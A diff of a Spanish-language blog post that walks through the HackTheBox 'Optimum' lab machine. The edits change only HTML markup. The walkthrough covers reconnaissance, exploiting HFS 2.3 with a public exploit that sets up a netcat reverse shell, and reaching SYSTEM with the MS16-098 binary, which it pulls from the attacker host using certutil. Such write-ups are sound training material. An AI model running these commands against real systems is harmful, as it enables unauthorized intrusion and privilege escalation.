@@ -1,14 +1,14 @@
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/optimum/02-tarjeta.png" />
 </p>
 
 <p>¡Hola!
-En esta ocasión vamos a resolver de la máquina <code class="highlighter-rouge">optimum</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
+En esta ocasión vamos a resolver de la máquina <code class="language-plaintext highlighter-rouge">optimum</code> de <a href="https://hackthebox.com/">HackTheBox</a>.
 La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, al enfrentar estos retos, ¡vamos a ponernos hack!</p>
 
 <h2 id="preparación">PREPARACIÓN</h2>
 
-<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="highlighter-rouge">optimum</code> y los subdirectorios <code class="highlighter-rouge">recon</code> junto con <code class="highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
+<p>Para iniciar nuestra máquina, vamos a crear con nuestra función <a href="https://bast1ant1c.github.io/mkhack/">mkhack</a> un directorio de trabajo con el nombre <code class="language-plaintext highlighter-rouge">optimum</code> y los subdirectorios <code class="language-plaintext highlighter-rouge">recon</code> junto con <code class="language-plaintext highlighter-rouge">exploit</code>, con el objetivo de organizar la información que recopilemos en la realización de la máquina.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkhack optimum
 <span class="nb">cd</span> <span class="o">!</span><span class="nv">$/</span>recon
@@ -16,7 +16,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 
 <h2 id="reconocimiento">RECONOCIMIENTO</h2>
 
-<p>Accedemos al directorio <code class="highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
+<p>Accedemos al directorio <code class="language-plaintext highlighter-rouge">recon</code> e iniciamos nuestra fase de reconocimiento sobre el objetivo por medio de nuestra utilidad <a href="https://bast1ant1c.github.io/osping/">osping</a> detectando el tipo de sistema operativo basado en el <code class="language-plaintext highlighter-rouge">ttl</code> <em>time to live</em> de una traza <strong>ICMP</strong>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>osping 10.10.10.8
 
@@ -38,7 +38,7 @@ La máquina es nivel “Easy”, sin embargo, el nivel siempre se lo pones tú, 
 80/tcp open  http
 </code></pre></div></div>
 
-<p>Luego de identificar los puertos abiertos <code class="highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
+<p>Luego de identificar los puertos abiertos <code class="language-plaintext highlighter-rouge">OPEN</code>, se procede a escanear servicios y versiones que puedan estar en nuestro objetivo.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p80</span> <span class="nt">-sCV</span> 10.10.10.8 <span class="nt">-oN</span> versions
 PORT   STATE SERVICE VERSION
@@ -50,7 +50,7 @@ Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
 
 <h2 id="reconocimiento-web">RECONOCIMIENTO WEB</h2>
 
-<p>Iniciamos con el reconocimiento del servicio <code class="highlighter-rouge">web</code> donde inicialmente, por medio de la utilidad <code class="highlighter-rouge">whatweb</code> enumeramos información de librerías, gestores de contenido, entre otros.</p>
+<p>Iniciamos con el reconocimiento del servicio <code class="language-plaintext highlighter-rouge">web</code> donde inicialmente, por medio de la utilidad <code class="language-plaintext highlighter-rouge">whatweb</code> enumeramos información de librerías, gestores de contenido, entre otros.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.10.8
 http://10.10.10.8 <span class="o">[</span>200 OK] Cookies[HFS_SID], Country[RESERVED][ZZ], HTTPServer[HFS 2.3], HttpFileServer, IP[10.10.10.8], JQuery[1.4.4], Script[text/javascript], Title[HFS /]
@@ -58,7 +58,7 @@ http://10.10.10.8 <span class="o">[</span>200 OK] Cookies[HFS_SID], Country[RESE
 
 <h2 id="intrusion">INTRUSION</h2>
 
-<p>Hacemos uso de <code class="highlighter-rouge">searchsploit</code> buscando potenciales maneras de intrusión por medio de la explotación de <code class="highlighter-rouge">HFS 2.3</code>.</p>
+<p>Hacemos uso de <code class="language-plaintext highlighter-rouge">searchsploit</code> buscando potenciales maneras de intrusión por medio de la explotación de <code class="language-plaintext highlighter-rouge">HFS 2.3</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit HFS 2.3
 <span class="nt">------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">-------------------------------</span>
@@ -73,13 +73,13 @@ Rejetto HTTP File Server <span class="o">(</span>HFS<span class="o">)</span> 2.3
 <span class="nt">------------------------------------------------------------------------------------------------------------------------------------</span> <span class="nt">-------------------------------</span>
 </code></pre></div></div>
 
-<p>Vamos a ubicarnos en la carpeta <code class="highlighter-rouge">exploit</code> y a descargar el exploit <code class="highlighter-rouge">windows/remote/39161.py</code>.</p>
+<p>Vamos a ubicarnos en la carpeta <code class="language-plaintext highlighter-rouge">exploit</code> y a descargar el exploit <code class="language-plaintext highlighter-rouge">windows/remote/39161.py</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> ../exploit
 searchsploit <span class="nt">-m</span> windows/remote/39161.py
 </code></pre></div></div>
 
-<p>Luego de revisar el exploit, debemos modificar las líneas 35 y 36, ingresando la IP de nuestra máquina y el puerto por el cual vamos a estar por escucha a través de la utilidad <code class="highlighter-rouge">nc</code>.</p>
+<p>Luego de revisar el exploit, debemos modificar las líneas 35 y 36, ingresando la IP de nuestra máquina y el puerto por el cual vamos a estar por escucha a través de la utilidad <code class="language-plaintext highlighter-rouge">nc</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim 39161.py
 <span class="c">#MODIFICAR LINEA 35 Y 36</span>
@@ -87,18 +87,18 @@ ip_addr <span class="o">=</span> <span class="s2">"10.10.14.2"</span> <span clas
 local_port <span class="o">=</span> <span class="s2">"4564"</span> <span class="c"># Local Port number</span>
 </code></pre></div></div>
 
-<p>Para que el exploit funcione debemos copiar la utilidad <code class="highlighter-rouge">nc.exe</code> en la carpeta <code class="highlighter-rouge">exploit</code>.</p>
+<p>Para que el exploit funcione debemos copiar la utilidad <code class="language-plaintext highlighter-rouge">nc.exe</code> en la carpeta <code class="language-plaintext highlighter-rouge">exploit</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>locate nc.exe
 <span class="nb">cp</span> /usr/share/sqlninja/apps/nc.exe <span class="nb">.</span>
 </code></pre></div></div>
 
-<p>Activamos un servidor local <code class="highlighter-rouge">http</code> con <code class="highlighter-rouge">python</code> por el puerto <code class="highlighter-rouge">80</code>, para que el exploit pueda consultar y cargar el <code class="highlighter-rouge">nc.exe</code> que copiamos anteriormente.</p>
+<p>Activamos un servidor local <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python</code> por el puerto <code class="language-plaintext highlighter-rouge">80</code>, para que el exploit pueda consultar y cargar el <code class="language-plaintext highlighter-rouge">nc.exe</code> que copiamos anteriormente.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
 </code></pre></div></div>
 
-<p>Generamos un listener con <code class="highlighter-rouge">rlwrap</code> para tener mayor estabilidad en la shell que vamos a obtener.</p>
+<p>Generamos un listener con <code class="language-plaintext highlighter-rouge">rlwrap</code> para tener mayor estabilidad en la shell que vamos a obtener.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rlwrap nc <span class="nt">-lvnp</span> 4564
 </code></pre></div></div>
@@ -108,7 +108,7 @@ local_port <span class="o">=</span> <span class="s2">"4564"</span> <span class="
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python 39161.py 10.10.10.8 80
 </code></pre></div></div>
 
-<p><em>NOTA: El exploit se debe ejecutar dos veces, la primera para cargar el binario <code class="highlighter-rouge">nc.exe</code> y la segunda para entablar una reverse shell</em></p>
+<p><em>NOTA: El exploit se debe ejecutar dos veces, la primera para cargar el binario <code class="language-plaintext highlighter-rouge">nc.exe</code> y la segunda para entablar una reverse shell</em></p>
 
 <p>
 <img src="/assets/images/optimum/03-page.png" />
@@ -121,32 +121,32 @@ local_port <span class="o">=</span> <span class="s2">"4564"</span> <span class="
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
 </code></pre></div></div>
 
-<p>Vamos a actualizar la base de vulnerabilidades con el parámetro <code class="highlighter-rouge">-u</code></p>
+<p>Vamos a actualizar la base de vulnerabilidades con el parámetro <code class="language-plaintext highlighter-rouge">-u</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 windows-exploit-suggester.py <span class="nt">-u</span>
 </code></pre></div></div>
 
-<p>Luego de obtener nuestra base de vulnerabilidades al día, vamos a ejecutar el comando <code class="highlighter-rouge">systeminfo</code> en la máquina víctima y copiamos el output en un archivo de nuestra máquina denominado <code class="highlighter-rouge">systeminfo.txt</code></p>
+<p>Luego de obtener nuestra base de vulnerabilidades al día, vamos a ejecutar el comando <code class="language-plaintext highlighter-rouge">systeminfo</code> en la máquina víctima y copiamos el output en un archivo de nuestra máquina denominado <code class="language-plaintext highlighter-rouge">systeminfo.txt</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vim systeminfo.txt
 </code></pre></div></div>
 
-<p>Debido a que el exploit se encuentra en <code class="highlighter-rouge">python2</code>, procedemos a generar un entorno virtualizado por medio de la utilidad <code class="highlighter-rouge">virtualenv</code> y activarlo por medio <code class="highlighter-rouge">source</code>.</p>
+<p>Debido a que el exploit se encuentra en <code class="language-plaintext highlighter-rouge">python2</code>, procedemos a generar un entorno virtualizado por medio de la utilidad <code class="language-plaintext highlighter-rouge">virtualenv</code> y activarlo por medio <code class="language-plaintext highlighter-rouge">source</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>virtualenv <span class="nt">-p</span> python2 privesc<span class="p">;</span> <span class="nb">source </span>privesc/bin/activate
 </code></pre></div></div>
 
-<p>Para que el exploit funcione correctamente, vamos a desinstalar la versión actual de <code class="highlighter-rouge">xlrd</code> y realizamos la instalación de <code class="highlighter-rouge">xlrd==1.2.0</code>, todo por medio de <code class="highlighter-rouge">pip2</code></p>
+<p>Para que el exploit funcione correctamente, vamos a desinstalar la versión actual de <code class="language-plaintext highlighter-rouge">xlrd</code> y realizamos la instalación de <code class="language-plaintext highlighter-rouge">xlrd==1.2.0</code>, todo por medio de <code class="language-plaintext highlighter-rouge">pip2</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip2 uninstall xlrd<span class="p">;</span> pip2 <span class="nb">install </span><span class="nv">xlrd</span><span class="o">==</span>1.2.0
 </code></pre></div></div>
 
-<p>Ahora que ya tenemos todos los requisitos, podemos ejecutar el script asignando la base de vulnerabilidades actualizada anteriormente con el parámetro <code class="highlighter-rouge">-d</code> y la información extraída del <code class="highlighter-rouge">systeminfo</code> ejecutada en la máquina víctima.</p>
+<p>Ahora que ya tenemos todos los requisitos, podemos ejecutar el script asignando la base de vulnerabilidades actualizada anteriormente con el parámetro <code class="language-plaintext highlighter-rouge">-d</code> y la información extraída del <code class="language-plaintext highlighter-rouge">systeminfo</code> ejecutada en la máquina víctima.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python2 windows-exploit-suggester.py <span class="nt">-d</span> 2022-08-04-mssb.xls <span class="nt">-i</span> systeminfo.txt
 </code></pre></div></div>
 
-<p>En el output del exploit, nos muestra las vulnerabilidades que pueden ser potencialmente explotadas, según la información suministrada en la enumeración de la máquina víctima, en este caso nos centramos en la vulnerabilidad <code class="highlighter-rouge">MS16-098</code>.</p>
+<p>En el output del exploit, nos muestra las vulnerabilidades que pueden ser potencialmente explotadas, según la información suministrada en la enumeración de la máquina víctima, en este caso nos centramos en la vulnerabilidad <code class="language-plaintext highlighter-rouge">MS16-098</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>E] MS16-098: Security Update <span class="k">for </span>Windows Kernel-Mode Drivers <span class="o">(</span>3178466<span class="o">)</span> - Important
 <span class="o">[</span><span class="k">*</span><span class="o">]</span>   https://www.exploit-db.com/exploits/41020/ <span class="nt">--</span> Microsoft Windows 8.1 <span class="o">(</span>x64<span class="o">)</span> - RGNOBJ Integer Overflow <span class="o">(</span>MS16-098<span class="o">)</span>
@@ -159,24 +159,24 @@ local_port <span class="o">=</span> <span class="s2">"4564"</span> <span class="
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/offensive-security/exploitdb-bin-sploits/blob/master/bin-sploits/41020.exe
 </code></pre></div></div>
 
-<p>Generamos un servicio <code class="highlighter-rouge">http</code> con <code class="highlighter-rouge">python</code> por el puerto <code class="highlighter-rouge">80</code> para cargar el binario a la máquina víctima.</p>
+<p>Generamos un servicio <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python</code> por el puerto <code class="language-plaintext highlighter-rouge">80</code> para cargar el binario a la máquina víctima.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>python3 <span class="nt">-m</span> http.server 80
 </code></pre></div></div>
 
-<p>En la máquina objetivo accedemos a la carpeta <code class="highlighter-rouge">C:\Windows/Temp</code> y creamos una nueva carpeta denominada <code class="highlighter-rouge">priv</code>.</p>
+<p>En la máquina objetivo accedemos a la carpeta <code class="language-plaintext highlighter-rouge">C:\Windows/Temp</code> y creamos una nueva carpeta denominada <code class="language-plaintext highlighter-rouge">priv</code>.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\W</span>indows<span class="se">\T</span>emp
 <span class="nb">mkdir </span>priv
 <span class="nb">cd </span>priv
 </code></pre></div></div>
 
-<p>Ahora con <code class="highlighter-rouge">certutil.exe</code> realizamos la carga del binario y le asignamos el nombre <code class="highlighter-rouge">exploit.exe</code></p>
+<p>Ahora con <code class="language-plaintext highlighter-rouge">certutil.exe</code> realizamos la carga del binario y le asignamos el nombre <code class="language-plaintext highlighter-rouge">exploit.exe</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certutil.exe <span class="nt">-f</span> <span class="nt">-urlcache</span> <span class="nt">-split</span> http://10.10.14.2/41020.exe exploit.exe
 </code></pre></div></div>
 
-<p>Finalmente ejecutamos el exploit y obtenemos acceso a el usuario <code class="highlighter-rouge">nt authority/system</code></p>
+<p>Finalmente ejecutamos el exploit y obtenemos acceso a el usuario <code class="language-plaintext highlighter-rouge">nt authority/system</code></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit.exe
 <span class="nb">whoami
@@ -187,7 +187,7 @@ local_port <span class="o">=</span> <span class="s2">"4564"</span> <span class="
 
 <h2 id="flags">FLAGS</h2>
 
-<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
+<p>Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con <code class="language-plaintext highlighter-rouge">type</code>, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>C:<span class="se">\</span>
 <span class="nb">dir</span> /b/s user.txt<span class="k">*</span>
@@ -204,9 +204,9 @@ echo.%root:~1,10%
 1ed1b36553
 </code></pre></div></div>
 
-<p>¡Hemos logrado completar la máquina <code class="highlighter-rouge">optimum</code> de HackTheBox!</p>
+<p>¡Hemos logrado completar la máquina <code class="language-plaintext highlighter-rouge">optimum</code> de HackTheBox!</p>
 
-<p align="center">
+<p style="text-align: center;">
 <img src="/assets/images/optimum/04-finish.png" />
 </p>
 
